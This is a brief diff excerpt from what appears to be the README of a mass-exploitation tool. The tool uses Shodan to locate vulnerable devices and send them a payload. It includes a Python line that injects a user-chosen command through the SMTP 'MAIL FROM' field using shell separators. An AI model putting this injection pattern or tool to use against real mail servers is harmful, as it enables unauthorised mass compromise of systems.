@@ -9,6 +9,7 @@ The Shodan API to find vulnerable devices and mass sends a payload to the target
 
 To customize the payload :
 s.send(bytes(f'MAIL FROM:<;{payload};>\r\n', 'utf-8'))
+
 Change the variable 'payload' to your desired payload 
 
 ----------------------------------------------------------------------------------
